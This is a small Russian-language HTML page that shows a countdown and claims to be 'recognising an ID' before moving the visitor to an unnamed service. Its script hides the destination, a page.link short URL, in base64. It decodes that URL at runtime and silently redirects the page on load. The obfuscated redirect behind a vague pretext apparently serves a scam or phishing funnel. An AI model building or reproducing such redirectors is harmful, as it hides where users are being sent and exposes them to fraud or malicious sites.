<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>ожидайте перехода.......</title></head>
<body>
<br>
<center><span style="color:#000000;font-family: Arial, Helvetica, sans-serif;font-size:16px;line-height:14px;">Подождите немного, распознавание ID<br> Примерно через <span style="color:green;font-size:18px;font-weight: bold;" id="timer" name="timer">6</span> секунд, переведем вас на сервис.....</span></center>
<br><center><div class="qSmJ"><img src="https://cdn.dribbble.com/users/597268/screenshots/2991038/dribbble_2x.gif"></div></center>
<script type="text/javascript">
var timer=5;
 function ftimer()
 {
  document.getElementById("timer").innerHTML=timer;
  timer= timer-1;
   if(timer==4)
   {
var encode = "aHR0cHM6Ly9saWZleW91LnBhZ2UubGluay9vZjE=";
var need_url = window.atob(encode);
console.log(need_url)
   	  location.replace(need_url)
   }
   setTimeout('ftimer()',1000);
 }
</script>
<script type="text/javascript">
    ftimer();
</script>
</body>
</html>
